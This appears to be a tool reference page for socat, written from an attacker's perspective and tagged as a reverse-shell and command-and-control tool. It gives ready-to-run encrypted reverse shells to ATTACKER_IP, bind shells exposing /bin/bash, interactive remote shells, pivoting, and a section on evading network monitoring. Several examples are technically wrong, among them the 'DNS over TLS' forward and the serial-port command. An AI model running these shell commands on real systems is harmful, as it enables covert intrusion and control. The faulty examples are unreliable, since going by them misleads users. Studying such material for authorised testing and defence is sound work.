---
title: "socat - Multipurpose Relay"
description: "Bidirectional data transfer tool for creating encrypted reverse shells, port forwarding, and socket manipulation"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
package: "socat"
kali_install: "sudo apt install socat"
version: "1.8.1.1"
---

# socat

## Overview

socat (SOcket CAT) is a multipurpose relay that establishes two bidirectional byte streams and transfers data between them. It supports a vast array of address types including TCP, UDP, SSL/TLS, SOCKS, serial ports, files, and pipes. socat's versatility makes it the most powerful tool for creating encrypted reverse shells, port forwarding, and complex network configurations.

## Chapter 1: Installation

### Kali Linux

```bash
sudo apt install socat
```

### Verify Installation

```bash
socat -V
```

## Chapter 2: Basic Usage

### Simple Listener

```bash
socat TCP-LISTEN:4444,fork STDOUT
```

**Explanation**: `TCP-LISTEN:4444` creates a TCP listener on port 4444, `fork` handles multiple connections, and `STDOUT` outputs received data to the terminal.

### Connect to Host

```bash
socat - TCP:192.168.1.100:4444
```

**Explanation**: Connects to the specified TCP endpoint. Data from stdin is sent to the remote host, and data received is displayed on stdout.

## Chapter 3: Encrypted Reverse Shells

### SSL Reverse Shell

```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem

# Attacker (listener)
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 STDOUT

# Target
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash
```

**Explanation**: The attacker creates an SSL listener that accepts encrypted connections. The target connects using SSL and executes `/bin/bash`, providing an encrypted reverse shell. `verify=0` disables certificate verification for self-signed certificates.

### SSL Bind Shell

```bash
# Target
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,reuseaddr,fork EXEC:/bin/bash

# Attacker
socat OPENSSL:192.168.1.100:4444,verify=0 STDOUT
```

**Explanation**: The target listens for SSL connections and provides a shell. `reuseaddr` allows port reuse, and `fork` handles multiple simultaneous connections.

### SSL with Client Certificate

```bash
# Generate CA and client certificate
openssl req -newkey rsa:2048 -nodes -keyout ca.key -x509 -days 365 -out ca.crt
openssl req -newkey rsa:2048 -nodes -keyout client.key -out client.csr
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt

# Server
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=1,cafile=ca.crt STDOUT

# Client
socat OPENSSL:SERVER_IP:4444,cert=client.pem,cafile=ca.crt STDOUT
```

**Explanation**: Mutual TLS authentication ensures both server and client are verified. The server validates the client's certificate against the CA, providing bidirectional authentication.

## Chapter 4: Port Forwarding

### TCP Port Forward

```bash
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```

**Explanation**: Listens on port 8080 and forwards all connections to port 80 on the internal host. The `fork` option handles multiple concurrent connections.

### UDP Port Forward

```bash
socat UDP-LISTEN:53,fork UDP:192.168.1.100:53
```

**Explanation**: Forwards UDP traffic from port 53 to the specified internal host. UDP forwarding is connectionless and does not require `fork` for multiple sources.

### SSL Port Forward

```bash
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:192.168.1.100:80
```

**Explanation**: Accepts SSL connections on port 443 and forwards them to an internal HTTP server on port 80. This provides SSL termination for internal services.

## Chapter 5: Remote Access

### Remote Shell Access

```bash
# Target
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Attacker
socat file:`tty`,raw,echo=0 TCP:192.168.1.100:4444
```

**Explanation**: The target provides a shell with PTY allocation, stderr redirection, and proper signal handling. The attacker gets a fully interactive shell with job control and signal support.

### SSH over SSL

```bash
socat OPENSSL-LISTEN:2222,cert=server.pem,verify=0,reuseaddr,fork TCP:localhost:22
```

**Explanation**: Wraps an SSH service with SSL encryption. Clients connect to port 2222 with SSL, and the traffic is forwarded to the local SSH daemon on port 22.

## Chapter 6: Advanced Techniques

### SOCKS Proxy

```bash
socat TCP-LISTEN:1080,fork SOCKS4A:proxy_host:target_host:443,socksuser=nobody
```

**Explanation**: Creates a SOCKS4a proxy that routes traffic through a proxy server. Applications configured to use this SOCKS proxy can reach remote hosts through the proxy chain.

### Shell with Environment

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"/bin/bash -li",pty,stderr,setsid,sigint,sane
```

**Explanation**: Provides an interactive login shell with PTY support. The `-li` flags enable login shell behavior, providing environment variables and startup scripts.

### File Transfer over SSL

```bash
# Receiver
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 FILE:received_file,create

# Sender
socat OPENSSL:SERVER_IP:4444,verify=0 FILE:file_to_send
```

**Explanation**: Transfers files through an SSL-encrypted tunnel. The `create` option creates the output file if it does not exist.

## Chapter 7: Evasion and Stealth

### Traffic Obfuscation

socat's SSL traffic appears as standard HTTPS to network monitors. Combined with standard port numbers (443), the traffic blends with legitimate web browsing.

### DNS over TLS

```bash
socat TCP-LISTEN:53,reuseaddr,fork TCP:8.8.8.8:853
```

**Explanation**: Redirects DNS queries to DNS-over-TLS, encrypting DNS traffic and preventing monitoring of DNS queries.

### Multi-Stage Pivoting

```bash
# Stage 1: External relay
socat TCP-LISTEN:4444,fork TCP:internal_host:80

# Stage 2: Internal forward
socat TCP-LISTEN:80,reuseaddr,fork TCP:127.0.0.1:8080
```

**Explanation**: Chain multiple socat instances to create multi-hop pivots through different network segments, each hop using a different relay.

## Chapter 8: Practical Scenarios

### Web Server with SSL Termination

```bash
socat OPENSSL-LISTEN:443,cert=web.pem,verify=0,reuseaddr,fork TCP:127.0.0.1:80
```

**Explanation**: Terminates SSL for a web server running on localhost:80. External clients connect via HTTPS on port 443, and socat decrypts the traffic before forwarding.

### Serial Console Access

```bash
socat - UNIX-CONNECT:/dev/ttyUSB0,rawer
```

**Explanation**: Connects to a serial device with raw I/O settings. This provides direct terminal access to embedded devices, routers, and other serial-console equipment.

## Resources

- [socat Homepage](http://www.dest-unreach.org/socat/)
- [socat man page](http://www.dest-unreach.org/socat/socat.html)
- [Kali Linux socat Page](https://www.kali.org/tools/socat/)
- [socat Examples](http://www.dest-unreach.org/socat/doc/socat.html)
